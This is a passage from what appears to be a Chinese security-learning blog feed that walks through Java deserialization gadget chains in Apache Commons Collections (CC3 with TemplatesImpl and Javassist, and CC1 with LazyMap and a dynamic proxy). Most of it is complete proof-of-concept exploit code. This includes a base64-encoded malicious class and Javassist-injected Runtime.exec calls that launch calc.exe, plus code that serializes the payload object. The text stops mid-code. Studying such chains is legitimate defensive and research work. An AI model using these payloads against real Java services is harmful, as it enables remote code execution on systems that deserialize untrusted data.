com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getOutputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>])<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span>  <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨javasist"><a href="#åˆ©ç”¨javasist" class="headerlink" title="åˆ©ç”¨javasist"></a>åˆ©ç”¨javasist</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc3</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(String name, Object target, Object value)</span> &#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> target.getClass().getDeclaredField(name);<br>           field.setAccessible(<span class="hljs-literal">true</span>);<br>           field.set(target, value);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception ignore) &#123;<br>      &#125;<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] createEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">abstractTranslet</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>       <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(new String[]&#123;\&quot;calc\&quot;&#125;);&quot;</span>;<br>       clazz.makeClassInitializer().insertBefore(cmd);<br>       clazz.setSuperclass(abstractTranslet);<br>       <span class="hljs-keyword">return</span> clazz.toBytecode();<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       setValue(<span class="hljs-string">&quot;_bytecodes&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;createEvil()&#125;);<br>       setValue(<span class="hljs-string">&quot;_name&quot;</span>, templates, <span class="hljs-string">&quot;a&quot;</span>);<br>       setValue(<span class="hljs-string">&quot;_tfactory&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;<br>              )<br>      &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>       <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),chainedTransformer);<br>       <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),<span class="hljs-literal">null</span>);<br>       <span class="hljs-type">HashMap</span> <span class="hljs-variable">hm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>       hm.put(tme,<span class="hljs-literal">null</span>);<br>       setValue(<span class="hljs-string">&quot;map&quot;</span>,tme,lazymap);<br>       <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos).writeObject(hm);<br>       <span class="hljs-type">String</span> <span class="hljs-variable">paylaod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<br>               Base64.getEncoder().encode(bos.toByteArray())<br>      );<br>       System.out.println(paylaod);<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<br>                       Base64.getDecoder().decode(paylaod)<br>              )<br>      );<br>       ois.readObject();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection1ï¼ˆLazyMapï¼‰</title>
    <link href="/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/"/>
    <url>/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollection1ï¼ˆLazyMapï¼‰"><a href="#CommonCollection1ï¼ˆLazyMapï¼‰" class="headerlink" title="CommonCollection1ï¼ˆLazyMapï¼‰"></a>CommonCollection1ï¼ˆLazyMapï¼‰</h1><p>ä»Šå¤©å‡†å¤‡å¤ä¹ cc3ï¼Œä½†æ˜¯æƒ³åˆ°å…¶å®cc3æ˜¯cc2å’Œcc1çš„ç»“åˆã€‚ç„¶åé‚£æ—¶å€™éƒ½å¿˜è®°å¤ä¹ cc1çš„å¦å¤–ä¸€æ¡é“¾å­äº†ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br> <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span>                     <br></code></pre></td></tr></table></figure><p>å˜å¾—æ— éå°±æ˜¯ **TransformedMap.setValue()<strong>è¿™ä¸€æ­¥å˜æˆäº†ï¼Œ</strong>LazyMap.get()**ï¼ŒLazyMapè¿™é‡Œç›¸å¯¹æ¥è¯´æ›´ç¹çä¸€äº›ã€‚<br>é€ä¸ªåˆ†æã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041849264.png" alt="QQæˆªå›¾20220304184908"></p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap()"></a>LazyMap()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041833631.png" alt="QQæˆªå›¾20220304183257"></p><p>å…¶ä¸­çš„getæ–¹æ³•è°ƒç”¨äº†<strong>transform</strong>ï¼Œåç»­è·Ÿtransformä¸€æ ·ã€‚<br>çœ‹ä¸€ä¸‹<strong>factory</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903384.png" alt="QQæˆªå›¾20220304183440"></p><p>å¯æ§ã€‚é‚£ä¹ˆç°åœ¨å°±è¦æ‰¾å“ªé‡Œè°ƒç”¨äº†<strong>getï¼ˆï¼‰</strong>æ–¹æ³•ã€‚</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>å…¶ä¸­çš„<strong>invoke</strong>åˆšå¥½è°ƒç”¨äº†<strong>get</strong>æ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041837323.png" alt="QQæˆªå›¾20220304183737"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„<strong>menberValues</strong>ï¼Œä¹Ÿæ˜¯å¯æ§çš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903317.png" alt="QQæˆªå›¾20220304183835"></p><p>åœ¨æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯è¿™é‡Œç»§æ‰¿äº†<strong>InvocationHandler</strong>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041839966.png" alt="QQæˆªå›¾20220304183700"></p><p>é‚£ä¹ˆè¦è°ƒç”¨è¿™é‡Œçš„<strong>invoke</strong>å°±è½»è€Œæ˜“ä¸¾äº†ã€‚ç›´æ¥ä¸€æ³¢åŠ¨æ€ä»£ç†ã€‚è‡³äºåŠ¨æ€ä»£ç†emmmä¹‹å‰å¤ä¹ æ–‡ç« æœ‰ã€‚å˜¿å˜¿ã€‚</p><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><p>ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºå…¥å£ç‚¹æ˜¯sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(objectObjectHashMap, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorate);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, (InvocationHandler) o);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, proxyMap);<br>        serialize(o1);<br>        